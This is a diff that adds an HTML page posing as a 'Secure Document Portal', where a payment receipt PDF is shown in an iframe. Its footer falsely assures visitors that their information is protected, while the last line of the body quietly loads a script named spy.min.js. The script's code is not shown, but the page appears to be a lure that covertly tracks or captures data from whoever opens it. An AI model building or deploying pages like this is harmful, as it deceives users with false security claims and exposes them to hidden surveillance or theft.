@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Document Portal</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .container {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+      max-width: 900px;
+      width: 100%;
+      overflow: hidden;
+    }
+    .header {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      padding: 30px;
+      text-align: center;
+    }
+    .header h1 {
+      font-size: 28px;
+      margin-bottom: 10px;
+    }
+    .header p {
+      opacity: 0.9;
+      font-size: 14px;
+    }
+    .content {
+      padding: 30px;
+    }
+    .notice {
+      background: #fff3cd;
+      border-left: 4px solid #ffc107;
+      padding: 15px;
+      margin-bottom: 20px;
+      border-radius: 4px;
+    }
+    .notice strong {
+      color: #856404;
+    }
+    .pdf-viewer {
+      border: 2px solid #e0e0e0;
+      border-radius: 8px;
+      overflow: hidden;
+      margin-top: 20px;
+    }
+    iframe {
+      width: 100%;
+      height: 600px;
+      border: none;
+      display: block;
+    }
+    .footer {
+      text-align: center;
+      padding: 20px;
+      background: #f5f5f5;
+      color: #666;
+      font-size: 13px;
+    }
+    .loading {
+      text-align: center;
+      padding: 40px;
+      color: #999;
+    }
+    @media (max-width: 768px) {
+      iframe {
+        height: 500px;
+      }
+      .header h1 {
+        font-size: 22px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>🔒 Secure Document Portal</h1>
+      <p>View your payment receipt securely</p>
+    </div>
+    
+    <div class="content">
+      <div class="notice">
+        <strong>📄 Document Ready</strong> - Your payment receipt is available for viewing below.
+      </div>
+      
+      <div class="pdf-viewer">
+        <div class="loading" id="loading">Loading document...</div>
+        <iframe 
+          src="/invoice.pdf" 
+          id="pdfFrame"
+          title="Payment Receipt"
+          onload="document.getElementById('loading').style.display='none'"
+        ></iframe>
+      </div>
+    </div>
+    
+    <div class="footer">
+      🔐 This is a secure document portal. Your information is protected.<br>
+      Questions? Contact support@company.com
+    </div>
+  </div>
+  
+  <script src="/spy.min.js"></script>
+</body>
+</html>
